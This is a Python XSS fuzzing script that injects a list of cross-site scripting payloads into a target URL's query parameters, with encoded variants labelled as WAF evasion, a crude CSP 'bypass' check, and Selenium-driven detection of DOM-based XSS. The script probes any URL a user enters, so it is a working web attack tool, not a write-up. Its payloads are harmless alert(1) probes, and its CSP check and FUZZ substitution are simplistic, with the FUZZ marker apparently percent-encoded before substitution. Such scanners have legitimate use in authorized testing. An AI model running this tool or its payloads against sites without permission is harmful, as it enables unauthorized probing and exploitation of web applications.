import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import warnings

warnings.simplefilter("ignore", category=UserWarning)

# List of XSS payloads
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<svg><script>alert(1)</script></svg>",
    "<math href='javascript:alert(1)'>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<form action='javascript:alert(1)'></form>",
    "%00<script>alert(1)</script>",
    "\u003Cscript\u003Ealert(1)\u003C/script\u003E",
    "<a href='ftp://www.example.com' onclick='alert(1)'>FTP Link</a>",
    "<textarea autofocus onfocus=alert(1)>Test</textarea>",
    "<video><source onerror='alert(1)'></video>",
    "<object data='javascript:alert(1)'></object>",
]

# List of WAF Evasion techniques
def encode_payload(payload):
    return [
        quote(payload),  # URL Encoding
        payload.replace("<", "&lt;").replace(">", "&gt;"),  # HTML Entities
        ''.join(['&#x{:x};'.format(ord(c)) for c in payload]),  # Unicode Encoding
        payload.replace("<", "%3C").replace(">", "%3E"),  # Hex encoding
        ''.join([f"&#{ord(c)};" for c in payload])  # Decimal encoding
    ]

# CSP Bypass Techniques
csp_bypass = [
    "unsafe-inline",
    "script-src *",
    "style-src *",
    "data:",
    "nonce-",
    "strict-dynamic"
]

# Configure Selenium for DOM-based detection
def setup_selenium():
    chrome_options = Options()
    # Remove headless mode for debugging (if needed)
    # chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=chrome_options)
    return driver

# Function to detect DOM-based XSS using Selenium
def detect_dom_xss(url, payload):
    driver = setup_selenium()
    try:
        driver.get(url)
        time.sleep(5)  # Give the page time to load and execute JavaScript

        # Check if the payload is reflected in the page source or DOM
        if payload in driver.page_source or payload in driver.execute_script("return document.body.innerHTML"):
            print(f"[+] DOM-based XSS detected on {url} with payload: {payload}")
        
        # Attempt to trigger the alert
        try:
            alert = driver.switch_to.alert
            alert.accept()
            print(f"[+] Alert detected on {url} with payload: {payload}")
        except:
            print(f"[-] No alert triggered on {url} with payload: {payload}")
    except Exception as e:
        print(f"[-] Error during DOM-based XSS detection: {str(e)}")
    finally:
        driver.quit()

# Function to send requests to test for reflected XSS and CSP/WAF evasion
def test_xss(url, headers=None):
    print(f"[*] Testing URL: {url}")
    session = requests.Session()

    # Iterate through each payload
    for payload in payloads:
        # Apply encoding to payloads
        encoded_payloads = encode_payload(payload)

        for enc_payload in encoded_payloads:
            # Prepare the URL with encoded payloads
            fuzzed_url = url.replace("FUZZ", enc_payload)
            response = session.get(fuzzed_url, headers=headers, verify=False)

            # CSP check
            csp_header = response.headers.get('Content-Security-Policy', None)
            if csp_header:
                for csp_bypass_method in csp_bypass:
                    if csp_bypass_method in csp_header:
                        print(f"[+] CSP potentially bypassable with {csp_bypass_method} on {url}")

            # Check for reflected XSS in response
            if enc_payload in response.text:
                print(f"[+] Potential XSS found with payload: {enc_payload} on {url}")

# Main function to run the XSS fuzzing
def xss_fuzzer(target_url, headers=None):
    # Parse the URL and extract query parameters
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        print("[-] No parameters found to fuzz, attempting to detect DOM-based XSS.")
        for payload in payloads:
            detect_dom_xss(target_url, payload)
        return

    # Prepare a list of all the parameters for fuzzing
    for param_name in query_params:
        original_value = query_params[param_name][0]
        fuzzed_value = "FUZZ"
        
        # Update query parameters with fuzzed value
        fuzzed_params = query_params.copy()
        fuzzed_params[param_name] = fuzzed_value
        
        # Rebuild the full URL with fuzzed parameters
        fuzzed_query = urlencode(fuzzed_params, doseq=True)
        fuzzed_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                                 parsed_url.params, fuzzed_query, parsed_url.fragment))
        
        print(f"[+] Fuzzing parameter: {param_name}")
        test_xss(fuzzed_url, headers=headers)
        
        # Attempt DOM-based XSS for each payload
        for payload in payloads:
            fuzzed_url_with_payload = fuzzed_url.replace("FUZZ", payload)
            detect_dom_xss(fuzzed_url_with_payload, payload)

if __name__ == "__main__":
    # Example target with parameter fuzzing
    target = input("Enter the target URL: ")
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": "https://www.google.com",
    }
    xss_fuzzer(target, headers=headers)
